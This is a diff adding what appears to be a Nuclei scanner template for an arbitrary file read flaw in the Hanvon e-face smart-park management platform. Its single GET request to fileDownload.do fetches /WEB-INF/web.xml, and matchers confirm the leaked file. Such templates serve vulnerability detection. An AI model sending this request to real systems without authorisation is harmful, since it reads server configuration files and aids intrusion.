@@ -1,0 +1,28 @@
+id: hw-e-face-pass-spmp-filedownload-do-anyfile-read
+info:
+  name: 汉王e脸通智慧园区管理平台 fileDownload.do 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "filename=web.xml"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
